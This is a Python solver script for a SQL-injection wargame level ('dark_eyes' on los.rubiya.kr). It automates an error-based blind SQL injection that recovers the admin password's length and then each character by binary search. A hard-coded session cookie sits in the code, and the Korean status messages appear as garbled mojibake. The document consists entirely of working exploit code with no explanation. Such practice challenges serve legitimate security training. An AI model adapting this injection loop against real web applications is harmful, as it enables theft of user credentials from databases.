import requests

def send(param):
    url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
    cookie = "dfksep8hnmequ6sm0qe1iu65pa"
    head = {"PHPSESSID":f"{cookie}"}
    my_url = url+param
    res = requests.get(my_url, cookies=head)
    return res.text

print("π LoS 21μ μμν©λλ€")

for num in range(0,100):
    param=f"?pw=' || (SELECT 1 UNION SELECT 2 where id='admin' and length(pw)={num}) %23"
    if("query" not in send(param)):
        print(f"π pwμ κΈΈμ΄λ {num}μλλ€!")
        break

ans=""

for len in range(1, num+1):
    start = 32
    end = 127
    while True:
        middle = round((start+end)/2)
        param=f"?pw=' || (SELECT 1 UNION SELECT 2 where id=\"admin\" and ascii(substr(pw,{len},1))>={middle}) %23"
        if("query" not in send(param)):
            param=f"?pw=' || (SELECT 1 UNION SELECT 2 where id=\"admin\" and ascii(substr(pw,{len},1))={middle}) %23"
            if("query" not in send(param)):
                print(f"{len}λ²μ§Έ λ¬Έμ β {chr(middle)}")
                ans+=chr(middle)
                break
            else:
                start = middle
                continue
        else:
            end = middle
            continue

print(f"π pwμ μ μ²΄λ [{ans}]μλλ€!")
